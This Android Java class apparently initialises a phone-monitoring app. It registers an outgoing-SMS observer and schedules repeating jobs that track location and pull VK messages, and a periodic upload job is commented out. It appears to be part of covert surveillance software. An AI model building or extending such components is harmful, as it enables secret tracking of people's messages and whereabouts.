package org.darkdefender.interceptor.scheduling;

import org.darkdefender.interceptor.regedit.Regedit;
import org.darkdefender.interceptor.utils.Constants;

import android.content.Context;

public class Init {
	
	public Init(Context ctx){
		//OUNGOING SMS OBSERVER
		new Regedit(ctx).registerSmsObserver();
		
		//UPDATE ALARMS INIT
		AlarmScheduling scheduler = new AlarmScheduling(ctx);
			scheduler.setAlarm(Constants.LOCATION_ALARM, 1000, 900000, 101);
			scheduler.setAlarm(Constants.UPDATE_VK_MESSAGES, 2000, 1800000, 102);
//			scheduler.setAlarm(Constants.TRY_UPLOAD, 0, 3600000, 103);  
	}

}
